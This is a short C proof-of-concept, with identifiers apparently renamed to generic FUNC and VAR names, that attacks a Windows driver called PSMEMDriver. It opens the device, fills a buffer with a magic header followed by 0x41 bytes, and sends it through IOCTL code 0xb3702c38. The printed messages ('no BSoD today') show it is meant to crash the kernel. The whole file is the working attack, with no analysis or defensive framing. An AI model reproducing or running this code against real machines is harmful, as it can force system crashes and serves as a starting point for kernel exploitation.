
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int lpInBuffer ;
typedef scalar_t__ ULONG64 ;
typedef int SIZE_T ;
typedef int * PVOID64 ;
typedef scalar_t__* PULONG64 ;
typedef int LPVOID ;
typedef scalar_t__ HANDLE ;


 int FUNC_0 (scalar_t__) ;
 int FUNC_1 (scalar_t__,int,int *,int *,int *,int *,scalar_t__*,int *) ;
 int VAR_0 ;
 scalar_t__ FUNC_2 (int ) ;
 int FUNC_3 () ;
 scalar_t__ VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int FUNC_4 (int *,int,int) ;
 int * FUNC_5 (int *,int,int,int ) ;
 int FUNC_6 (int ,int,int ) ;
 int FUNC_7 (char*,...) ;

int FUNC_8()
{

 HANDLE VAR_6 = ((void*)0);
 PVOID64 VAR_7 = ((void*)0);
 ULONG64 VAR_8;
 PVOID64 VAR_9 = ((void*)0);
 SIZE_T VAR_10 = 0x800;

 FUNC_7("Trying the get the handle for the PSMEMDriver device.\r\n");

 VAR_6 = FUNC_2(VAR_0);

 if (VAR_6 == VAR_1) {
  FUNC_7("Can't get the device handle, no BSoD today. 0x%X\r\n", FUNC_3());
  return 1;
 }


 VAR_7 = FUNC_5(((void*)0), VAR_10, VAR_2|VAR_4, VAR_5);


 if (VAR_7 == ((void*)0)) {
  FUNC_7("VirtualAlloc() failed. \r\n");
  return 1;
 }


 VAR_9 = (PVOID64)(((ULONG64)VAR_7));
 *(PULONG64)VAR_9 = (ULONG64)0x542DF91B;
 VAR_9 = (PVOID64)(((ULONG64)VAR_7 + 0x4));
 *(PULONG64)VAR_9 = (ULONG64)0x42424242;
 VAR_9 = (PVOID64)(((ULONG64)VAR_7 + 0x8));

 FUNC_4(VAR_9, VAR_10-0x8 , 0x41);



  FUNC_1(VAR_6,
   0xb3702c38,
   VAR_7,
   ((void*)0),
   ((void*)0),
   ((void*)0),
   &VAR_8,
   ((void*)0));


 FUNC_7("Cleaning up.\r\n");
 FUNC_6((LPVOID)VAR_7, sizeof(VAR_7), VAR_3);
 FUNC_0(VAR_6);
 FUNC_7("Resources freed up.\r\n");
    return 0;
}
